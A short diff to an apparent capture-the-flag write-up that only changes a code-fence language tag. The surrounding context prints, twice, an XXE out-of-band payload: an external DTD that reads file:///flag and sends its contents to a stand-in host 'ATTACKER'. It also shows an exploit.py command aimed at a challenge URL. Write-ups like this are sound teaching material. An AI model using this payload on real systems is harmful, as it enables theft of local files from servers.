@@ -3303,7 +3303,7 @@ External general entities get blinded, and file content may contain
 XML-breaking characters, so we use the standard external-DTD plus parameter-entity
 OOB pattern. Hosted `e.dtd`:
 
-```dtd
+```xml
 <!ENTITY % file SYSTEM "file:///flag">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER/x?d=%file;'>">
 %eval;
@@ -3530,7 +3530,7 @@ python3 exploit.py -u https://eci-2zee1cvig94bwcb1mt5a.cloudeci1.ichunqiu.com:50
 
 Attacker DTD (`e.dtd`):
 
-```dtd
+```xml
 <!ENTITY % file SYSTEM "file:///flag">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER/x?d=%file;'>">
 %eval;
